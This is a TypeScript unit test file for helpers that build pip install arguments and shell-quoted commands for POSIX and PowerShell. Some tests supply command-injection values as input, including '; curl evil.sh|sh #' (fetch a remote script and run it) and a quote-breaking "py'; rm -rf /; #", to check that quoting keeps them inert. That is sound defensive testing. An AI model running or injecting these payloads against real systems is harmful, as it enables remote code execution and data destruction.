import * as assert from 'assert';
import { buildInstallArgv, buildInstallCommand } from '../../src/common/depsNotification';

suite('buildInstallArgv', () => {
    test('drops the interpreter and returns the pip args', () => {
        assert.deepStrictEqual(buildInstallArgv(['/usr/bin/python3'], '/r.txt'), [
            '-m',
            'pip',
            'install',
            '-r',
            '/r.txt',
        ]);
    });
    test('preserves leading interpreter args', () => {
        assert.deepStrictEqual(buildInstallArgv(['py', '-3.14'], '/r.txt'), [
            '-3.14',
            '-m',
            'pip',
            'install',
            '-r',
            '/r.txt',
        ]);
    });
    test('keeps shell metacharacters as one inert argv entry', () => {
        // This is the argv the terminal actually runs; no shell ever parses it.
        assert.deepStrictEqual(buildInstallArgv(['python3', '; curl evil.sh|sh #'], '/r.txt'), [
            '; curl evil.sh|sh #',
            '-m',
            'pip',
            'install',
            '-r',
            '/r.txt',
        ]);
    });
});

suite('buildInstallCommand', () => {
    test('quotes the interpreter and requirements path (posix)', () => {
        const cmd = buildInstallCommand(
            ['/usr/bin/python3'],
            '/ext/bundled/requirements.txt',
            'linux'
        );
        assert.strictEqual(
            cmd,
            "'/usr/bin/python3' '-m' 'pip' 'install' '-r' '/ext/bundled/requirements.txt'"
        );
    });
    test('quotes leading interpreter args (posix)', () => {
        const cmd = buildInstallCommand(['py', '-3.14'], '/r.txt', 'linux');
        assert.strictEqual(cmd, "'py' '-3.14' '-m' 'pip' 'install' '-r' '/r.txt'");
    });
    test('prefixes the PowerShell call operator on Windows', () => {
        const cmd = buildInstallCommand(
            ['C:\\Python313\\python.exe'],
            'C:\\ext\\bundled\\requirements.txt',
            'win32'
        );
        assert.strictEqual(
            cmd,
            "& 'C:\\Python313\\python.exe' '-m' 'pip' 'install' '-r' " +
                "'C:\\ext\\bundled\\requirements.txt'"
        );
    });
    test('keeps leading args after the call operator on Windows', () => {
        const cmd = buildInstallCommand(['py', '-3.13'], 'C:\\r.txt', 'win32');
        assert.strictEqual(cmd, "& 'py' '-3.13' '-m' 'pip' 'install' '-r' 'C:\\r.txt'");
    });
    test('neutralizes shell metacharacters in the displayed command (posix)', () => {
        const cmd = buildInstallCommand(['python3', '; curl evil.sh|sh #'], '/r.txt', 'linux');
        assert.strictEqual(
            cmd,
            "'python3' '; curl evil.sh|sh #' '-m' 'pip' 'install' '-r' '/r.txt'"
        );
    });
    test('escapes embedded single quotes so the quoting cannot be broken out of', () => {
        assert.strictEqual(
            buildInstallCommand(["py'; rm -rf /; #"], '/r.txt', 'linux'),
            "'py'\\''; rm -rf /; #' '-m' 'pip' 'install' '-r' '/r.txt'"
        );
        assert.strictEqual(
            buildInstallCommand(["py'; rm -rf /; #"], '/r.txt', 'win32'),
            "& 'py''; rm -rf /; #' '-m' 'pip' 'install' '-r' '/r.txt'"
        );
    });
});
